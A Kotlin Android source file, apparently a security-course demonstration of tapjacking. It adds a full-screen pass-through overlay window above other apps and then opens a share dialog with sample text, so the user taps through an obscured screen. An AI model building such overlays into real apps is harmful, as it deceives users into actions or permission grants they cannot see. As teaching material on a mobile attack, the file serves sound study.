package ar.edu.unq.seguridad.tapjacking

import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.os.IBinder
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.view.WindowManager
import android.view.WindowManager.LayoutParams.*
import android.widget.LinearLayout
import kotlin.properties.Delegates

public class OverlayService : Service() {

    val overlay by Delegates.lazy {
        val inflater = getApplicationContext().getSystemService(Context.LAYOUT_INFLATER_SERVICE) as LayoutInflater
        inflater.inflate(R.layout.service_alert, null)
    }

    override fun onCreate() {
        super.onCreate()

        overlay.setBackgroundColor(TRANSLUCENT_RED)

        val params = WindowManager.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT,
            TYPE_SYSTEM_ALERT,
            FLAG_NOT_TOUCHABLE,
            PixelFormat.TRANSLUCENT
        )

        overlay.findViewById(R.id.first_button).setOnClickListener {
            it.setVisibility(View.GONE)
        }
        (getSystemService(Context.WINDOW_SERVICE) as WindowManager).addView(overlay, params)

        sendText("Texto que quiero compartir")
    }

    private fun sendText(text:String) {
        val sendIntent = Intent();
        sendIntent.setAction(Intent.ACTION_SEND)
        sendIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        sendIntent.putExtra(Intent.EXTRA_TEXT, text)
        sendIntent.setType("text/plain")
        startActivity(sendIntent)
    }

    override fun onDestroy() {
        super.onDestroy()
        (getSystemService(Context.WINDOW_SERVICE) as WindowManager).removeView(overlay)
    }

    val TRANSLUCENT_RED = -1996554240
    override fun onBind(i: Intent): IBinder? {return null}

}
